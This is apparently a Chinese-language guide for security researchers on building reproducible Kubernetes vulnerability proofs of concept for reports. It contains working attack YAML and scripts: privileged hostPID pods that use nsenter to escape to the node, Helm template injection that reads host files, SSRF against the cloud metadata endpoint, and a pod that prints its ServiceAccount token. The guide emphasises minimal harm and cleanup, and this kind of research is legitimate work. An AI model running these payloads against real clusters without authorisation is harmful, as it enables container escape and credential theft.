---
description: 生成基础设施漏洞的可复现 PoC：kubectl 应用恶意 YAML、Helm 安装投毒 values、SSRF 探测云元数据。
tags: [infra, kubernetes, poc, reproduction, ssrf]
---

# PoC 生成 (PoC Generator)

## 1. 专家直觉触发器 (Triggers)

专家在准备漏洞报告时，会立即基于以下需求生成 PoC：

- **需要最小可复现资源**：将复杂的集群状态简化成单个 YAML 文件或一条 Helm 命令。
- **需要证明权限提升**：从普通用户 `edit` 角色到读取 `kube-system` Secret 的完整步骤必须可复现。
- **需要证明网络影响**：PoC 必须展示从 Pod 内部成功访问云元数据并返回有效凭证。
- **需要避免副作用**：PoC 不应真正删除数据或长时间占用资源，但需足够真实地展示漏洞。
- **需要自动化**：PoC 应封装为 shell 脚本或 Python 脚本，方便审核人员一键运行。

这些触发器要求 PoC 在“最小化”、“可复现”、“无害但真实”之间取得平衡。

## 2. 不可跳过的问题链 (Question Chain)

在生成 PoC 前，必须回答：

1. **PoC 的最小触发条件是什么？**  
   是一个单独的 `kubectl apply`，还是需要先创建 ServiceAccount 和 RoleBinding？
2. **环境依赖有哪些？**  
   是否需要特定版本的 K8s、Helm、某个 Operator？是否在 Minikube 和 EKS 上表现一致？
3. **如何证明漏洞存在而不造成实际损害？**  
   对于容器逃逸，是否只读取 `/etc/hostname` 而非修改 `/etc/shadow`？对于 SSRF，是否只获取元数据目录而非实际凭证？
4. **PoC 的输出如何被客观验证？**  
   是否返回 `HTTP 200` 并包含特定字符串？是否在 `kubectl logs` 中出现特定日志？
5. **清理步骤是否完整？**  
   `kubectl delete` 是否能完全移除 PoC 资源？是否修改了集群级配置（如 Webhook）需要手动恢复？
6. **PoC 是否能在无互联网环境中运行？**  
   是否依赖外部 C2 服务器？能否使用内部 HTTP Server 或 `busybox` 内置功能完成验证？

## 3. 攻击链闭合 (Attack Chain Closure)

PoC 必须将攻击链压缩为可重复验证的步骤。以下是“RBAC + 容器逃逸”的 PoC 逻辑：

**PoC 目标**：证明拥有 `create pods` 权限的普通用户可以在不拥有 `pods/exec` 权限的情况下获得节点级文件读取能力。

**步骤 1（前置）**：确认目标用户 `alice` 在命名空间 `poc` 内拥有 `create pods` 权限。
**步骤 2（投递）**：应用以下 PoC YAML：

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: poc-escape
spec:
  hostPID: true
  containers:
  - name: main
    image: busybox
    command: ["sh", "-c", "cat /proc/1/root/etc/hostname && sleep 30"]
    securityContext:
      runAsUser: 0
  restartPolicy: Never
```

**步骤 3（验证）**：Pod 启动后，`kubectl logs poc-escape` 应输出宿主的主机名，而非 Pod 自身的主机名。这证明 `hostPID` 生效，且容器进程可以访问宿主 `/proc` 文件系统。
**步骤 4（清理）**：执行 `kubectl delete pod poc-escape`。

**逻辑闭环**：如果 `create pods` 权限未被准入策略限制，则上述 PoC 在任何标准 K8s 集群上都能复现。因此，**该 PoC 的成功执行等价于集群存在命名空间逃逸漏洞**。

## 4. 代码示例 (Code Examples)

### 4.1 最小容器逃逸 PoC

```yaml
# poc-hostpid.yaml
apiVersion: v1
kind: Pod
metadata:
  name: poc-hostpid
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: p
    image: busybox:1.36
    command: ["sh","-c","echo 'HOSTNAME='$(cat /proc/1/root/etc/hostname) && nsenter -t 1 -m -u -i -n -p -- id"]
    securityContext:
      privileged: true
  restartPolicy: Never
```

执行与验证：

```bash
kubectl apply -f poc-hostpid.yaml
sleep 5
kubectl logs poc-hostpid
# 预期输出包含宿主 root 的 uid=0 以及宿主主机名
kubectl delete -f poc-hostpid.yaml
```

### 4.2 Helm 模板注入 PoC

```bash
#!/bin/bash
# poc_helm_injection.sh
cat > evil-values.yaml <<'EOF'
extraConfig: |
  {{ .Release.Name }}
  {{ .Values | toYaml }}
  {{ .Files.Get "/etc/hosts" }}
EOF

helm template test ./chart -f evil-values.yaml > rendered.yaml
grep -q "127.0.0.1" rendered.yaml && echo "[VULN] Template injection allows file read"
```

**说明**：若 `rendered.yaml` 包含 Helm 主机上的 `/etc/hosts` 内容，则证明服务器端模板注入。

### 4.3 Webhook SSRF PoC（需要集群内管理员配合演示）

```yaml
# poc-webhook-ssrf.yaml
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: poc-ssrf
webhooks:
- name: ssrf.example.com
  clientConfig:
    url: "http://169.254.169.254/latest/meta-data/"
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  admissionReviewVersions: ["v1"]
  sideEffects: None
```

验证命令：

```bash
kubectl apply -f poc-webhook-ssrf.yaml
# 尝试创建 Pod，观察 API Server 日志是否包含元数据响应
kubectl run test --image=busybox --restart=Never -- echo hello
# 清理
kubectl delete mutatingwebhookconfiguration poc-ssrf
```

### 4.4 云元数据 SSRF PoC（Pod 内执行）

```bash
kubectl run ssrf-probe --rm -i --restart=Never --image=curlimages/curl -- \
  curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null \
  && echo "[VULN] Metadata reachable from pod"
```

**说明**：在缺乏 NetworkPolicy 的集群中，该命令可直接证明云元数据可达。

### 4.5 最小 RBAC 权限提升 PoC

```bash
#!/bin/bash
# poc_rbac_escalation.sh
USER="alice"
NAMESPACE="default"

# 步骤 1：确认权限
kubectl auth can-i create pods -n $NAMESPACE --as=$USER || exit 1

# 步骤 2：创建特权 Pod（假设准入不拦截）
cat <<EOF | kubectl apply -f - --as=$USER
apiVersion: v1
kind: Pod
metadata:
  name: rbac-poc
spec:
  containers:
  - name: c
    image: busybox
    command: ["sh","-c","cat /var/run/secrets/kubernetes.io/serviceaccount/token && sleep 10"]
EOF

# 步骤 3：读取日志中的 ServiceAccount Token
sleep 5
kubectl logs rbac-poc
kubectl delete pod rbac-poc --as=$USER
```

**说明**：若能读取到 Token，则证明该用户可通过创建 Pod 窃取 ServiceAccount 凭证，实现权限横向移动。
